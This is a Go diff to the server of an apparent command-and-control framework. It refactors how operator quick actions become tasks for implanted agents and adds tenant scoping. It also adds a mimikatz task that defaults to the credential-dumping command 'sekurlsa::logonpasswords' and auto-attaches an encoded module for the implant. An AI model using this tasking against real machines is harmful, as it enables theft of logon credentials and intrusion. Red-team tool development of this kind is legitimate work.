@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"log/slog"
 	"net/http"
-	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
@@ -63,27 +62,29 @@ func (s *Server) handleToolkitQuickAction(c *gin.Context) {
 	if shell == "" {
 		shell = c.PostForm("shell")
 	}
-	user := c.GetString("username")
 
 	taskType, command := buildQuickActionCommand(action, param, shell)
 
-	task := db.Task{
-		AgentID:   agentID,
-		Type:      taskType,
-		Command:   command,
-		Shell:     shell,
-		Status:    "pending",
-		CreatedBy: user,
-		CreatedAt: time.Now(),
-		UpdatedAt: time.Now(),
-	}
+	spec := TaskSpec{Type: taskType, Command: command, Shell: shell}
 	if taskType == "usb_drop" {
-		task.Path = command
-		task.Command = ""
+		spec.Path = command
+		spec.Command = ""
+	}
+	if taskType == "mimikatz" {
+		// Match handleMimikatz: default the command and auto-attach the staged
+		// module so the implant does not need a local script.
+		if spec.Command == "" {
+			spec.Command = "sekurlsa::logonpasswords"
+		}
+		spec.Data = s.loadMimikatzModuleB64()
 	}
 
-	if err := s.db.Create(&task).Error; err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	// issueAgentTask, not a bare insert: it applies the tenant scope
+	// (getAgentOrFail) and the collaboration-lock gate (createTask). The direct
+	// s.db.Create this replaced let an operator queue work on another tenant's
+	// agent and silently overwrite an agent another operator was holding.
+	task := s.issueAgentTask(c, agentID, spec)
+	if task == nil {
 		return
 	}
 
@@ -92,7 +93,7 @@ func (s *Server) handleToolkitQuickAction(c *gin.Context) {
 		agentID, fmt.Sprintf("Action: %s, Param: %s", action, param),
 		true, nil)
 
-	s.broadcastTaskUpdate(agentID, task)
+	s.broadcastTaskUpdate(agentID, *task)
 
 	c.JSON(http.StatusOK, gin.H{
 		"success": true,
